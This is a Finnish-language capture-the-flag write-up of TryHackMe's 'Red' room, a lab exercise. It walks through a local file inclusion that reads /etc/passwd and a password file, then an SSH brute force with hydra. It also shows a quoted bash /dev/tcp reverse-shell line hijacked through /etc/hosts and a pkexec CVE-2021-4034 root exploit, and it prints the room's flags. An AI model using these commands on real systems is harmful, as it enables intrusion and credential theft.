---
title: "Red Writeup"
date: 2023-07-17
tags: [writeup, ctf, tryhackme]
description: "Avoimen palvelun hyödyntäminen jalansijan saamiseksi ja TryHackMe:n Red-huoneen roottaminen CVE-2021-4034 pkexec -haavoittuvuuden avulla."
---

## Setup 

Meidän täytyy ensin yhdistää tryhackmen VPN-palvelimeen. Saat lisätietoja tästä vierailemalla [Access](https://tryhackme.com/access)-sivulla.

Käytän openvpniä palvelimeen yhdistämiseen. Tässä on komento:

```
$ sudo openvpn --config NovusEdge.ovpn
```

## Tiedustelu

Nyt kun kaikki on valmista, tehdään perusrecon:
```shell-session
$ rustscan -b 4500 -a TARGET_IP --ulimit 5000 -t 2000 -r 1-65535  -- -sC -oN rustscan_port_scan.txt
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
| ssh-hostkey: 
|   3072 e2:74:1c:e0:f7:86:4d:69:46:f6:5b:4d:be:c3:9f:76 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1MTQvnXh8VLRlrK8tXP9JEHtHpU13E7cBXa1XFM/TZrXXpffMfJneLQvTtSQcXRUSvq3Z3fHLk4xhM1BEDl+XhlRdt+bHIP4O5Myk8qLX9E1FFpcy3NrEHJhxCCY/SdqrK2ZXyoeld1Ww+uHpP5UBPUQQZNypxYWDNB5K0tbDRU+Hw+p3H3BecZwue1J2bITy6+Y9MdgJKKaVBQXHCpLTOv3A7uznCK6gLEnqHvGoejKgFXsWk8i5LJxJqsHtQ4b+AaLS9QAy3v9EbhSyxAp7Zgcz0t7GFRgc4A5LBFZL0lUc3s++AXVG0hJ9cdVTBl282N1/hF8PG4T6JjhOVX955sEBDER4T6FcCPehqzCrX0cEeKX6y6hZSKnT4ps9kaazx9O4slrraF83O9iooBTtvZ7iGwZKiCwYFOofaIMv+IPuAJJuRT0156NAl6/iSHyUM3vD3AHU8k7OISBkndyAlvYcN/ONGWn4+K/XKxkoXOCW1xk5+0sxdLfMYLk2Vt8=
|   256 fb:84:73:da:6c:fe:b9:19:5a:6c:65:4d:d1:72:3b:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDooZFwx0zdNTNOdTPWqi+z2978Kmd6db0XpL5WDGB9BwKvTYTpweK/dt9UvcprM5zMllXuSs67lPNS53h5jlIE=
|   256 5e:37:75:fc:b3:64:e2:d8:d6:bc:9a:e6:7e:60:4d:3c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDyWZoVknPK7ItXpqVlgsise5Vaz2N5hstWzoIZfoVDt
80/tcp open  http    syn-ack
| http-title: Atlanta - Free business bootstrap template
|_Requested resource was /index.php?page=home.html
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

$ rustscan -b 4500 -a TARGET_IP --ulimit 5000 -t 2000 -p 22,80  -- -sV -oN rustscan_service_scan.txt
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Siistiä, eli meillä pyörii 2 palvelua: http-palvelin ja ssh-palvelin. Katsotaanpa, mitä http-palvelimelta löytyy:
![](/assets/img/writeup_assets/red/port-80.png)

Huomaa, että URL on: `http://TARGET_IP/index.php?page=home.html`. Se näyttää mahdolliselta LFI-vektorilta. Tarkistetaanpa, onko näin. Voimme kokeilla sisällyttää `index.php`-tiedoston ja katsoa, mitä tapahtuu:
```shell-session
$ curl "http://TARGET_IP/index.php?page=./index.php"

<?php 

function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}

?>

```

Bingo! Näemme, että `index.php`-tiedosto ottaa `page`-parametrin ja lukee sen määrittämän tiedoston. Syötettä sanitoidaan, mutta sen pystyy kiertämään. Katsotaanpa, voidaanko suoraan sisällyttää `/etc/issue` käyttämällä `php://`-filter-käärettä:
```shell-session
$ curl http://TARGET_IP/index.php?page=php://filter/resource=/etc/issue

Ubuntu 20.04.4 LTS \n \l
```

Mahtavaa! Entä `/etc/passwd`?
```shell-session
$ curl http://TARGET_IP/index.php?page=php://filter/resource=/etc/passwd

...
blue:x:1000:1000:blue:/home/blue:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
red:x:1001:1001::/home/red:/bin/bash
```

OK, meillä on siis 2 käyttäjää, joiden oikeudet voimme mahdollisesti saada: `red` ja `blue`. Tarkistetaan tiedostot heidän kotihakemistoistaan:
```shell-session
$ curl http://TARGET_IP/index.php?page=php://filter/resource=/home/blue/.bashrc
<NORMAL STUFF>

$ curl http://TARGET_IP/index.php?page=php://filter/resource=/home/red/.bashrc
<NOPE, NOTHING INTERESTING>

$ curl http://TARGET_IP/index.php?page=php://filter/resource=/home/blue/.bash_history
echo "Red rules"
cd
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
cat passlist.txt
rm passlist.txt
sudo apt-get remove hashcat -y
```

OOOOO Mielenkiintoista. Näyttää siltä, että joku on luonut salasanallistan hashcatilla... ja poistanut sen? Tästä `.reminder`-tiedoston poistamisesta ei ole merkintää, kannattaa kokeilla:
```shell-session
$ curl http://TARGET_IP/index.php?page=php://filter/resource=/home/blue/.reminder
sup3r_p@s$w0rd!
```

Hienoa! Luodaanpa nyt `passlist.txt`:
```shell-session
$ hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
$ wc passlist.txt                                  
  77   77 1114 passlist.txt
```

Koska yksi vihjeistä sanoo: 
> 2. Red likes to change adversaries' passwords but tends to keep them relatively the same. 

Oletan, että passlist sisältää kaikki mahdolliset salasanat käyttäjälle `blue`. Yritetään brute forcea sisään.

## Pääsyn saaminen

```shell-session
$ hydra -l blue -P passlist.txt -v TARGET_IP ssh  
...
[22][ssh] host: TARGET_IP   login: blue   password: [PASSWORD FROM passlist.txt]
...
```

Kirjaudutaan nyt koneelle näillä tunnuksilla:
```shell-session
$ ssh blue@TARGET_IP
...
blue@red:~$ ls -la
total 40
drwxr-xr-x 4 root blue 4096 Aug 14  2022 .
drwxr-xr-x 4 root root 4096 Aug 14  2022 ..
-rw-r--r-- 1 blue blue  166 Jul 17 13:30 .bash_history
-rw-r--r-- 1 blue blue  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 blue blue 3771 Feb 25  2020 .bashrc
drwx------ 2 blue blue 4096 Aug 13  2022 .cache
-rw-r----- 1 root blue   34 Aug 14  2022 flag1
-rw-r--r-- 1 blue blue  807 Feb 25  2020 .profile
-rw-r--r-- 1 blue blue   16 Aug 14  2022 .reminder
drwx------ 2 root blue 4096 Aug 13  2022 .ssh
blue@red:~$ cat flag1
THM{Is_thAt_all_y0u_can_d0_blU3?}
```

> What is the first flag?
> 
> Answer: `THM{Is_thAt_all_y0u_can_d0_blU3?}`

Pienen `linpeas`- ja `pspy`-analyysin jälkeen (tai vaihtoehtoisesti voit käyttää vain komentoa `ps -aux`) huomaamme 2 asiaa:

1. `/etc/hosts`-tiedostossa on rivi ja voimme vain _lisätä_ siihen:

```plaintext
127.0.0.1 localhost
127.0.1.1 red
192.168.0.1 redrules.thm

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouter
```

2. Taustalla pyörii jatkuvasti prosessi:

```shell
bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
```

_Mutta_ IP-osoite 192.168.0.1 ei itse asiassa johda mihinkään. Voimme siis vain lisätä `/etc/hosts`-tiedostoon rivin kohteelle `redrules.thm`, joka osoittaa meidän koneeseemme, ja käynnistää listenerin saadaksemme reverse shellin käyttäjänä red:
```shell-session
## On target:
$ echo "ATTACKER_IP redrules.thm" >> /etc/hosts

## On our machine:
$ nc -nvlp 9001

red@red$ ls
flag2

red@red$ cat flag2
THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}
```

> What is the second flag?
> 
> Answer: `THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}`

## Privilege Escalation

Kartoitetaan juttuja:
```shell-session
$ find / -perm /u=s,g=s 2>/dev/null
...
...
/home/red/.git/psexec
```

Okei... Eli. redin kotihakemistossa on `psexec`. Katsotaanpa, mikä versio se on:
```shell-session
red@red$ /home/red/.git/psexec --version
psexec version 0.105
```

Nopea haku netistä paljastaa, että tämä versio on haavoittuva ja sitä voidaan käyttää privesciin: (CVE-2021-4034)
Käytän Pythonilla kirjoitettua PoC-exploittia: https://github.com/Almorabea/pkexec-exploit
Skriptiä muokataan hieman: 
```diff
- libc.execve(b'/usr/bin/pkexec', c_char_p(None), environ_p)
+ libc.execve(b'/home/red/.git/pkexec', c_char_p(None), environ_p)
```

_Siirrä tämä kohteeseen ja aja se saadaksesi root-shellin :)_
Kun saamme root-shellin, voimme hakea root-flagin:
```shell-session
red@red$ python3 exploit.py
whoami
root

ls /root
...
flag3
...

cat /root/flag3
THM{Go0d_Gam3_Blu3_GG}
```

> What is the third flag?
> 
> Answer: `THM{Go0d_Gam3_Blu3_GG}`


## Yhteenveto

Tässä kesti rehellisesti sanottuna kauemmin kuin kehtaan myöntää sen ärsyttävän ulosheittomekanismin takia. Lisäksi tein asioista liian monimutkaisia, joten kaninkoloja riitti kerrakseen. Joka tapauksessa... toivottavasti tästä writeupista oli hyötyä. Jos pidit siitä, harkitsehan seuraamistani [githubissa](https://github.com/NovusEdge) ja tähden jättämistä [repolle](https://github.com/NovusEdge/thm-writeups)


- Room: [Red](https://tryhackme.com/room/redisl33t)
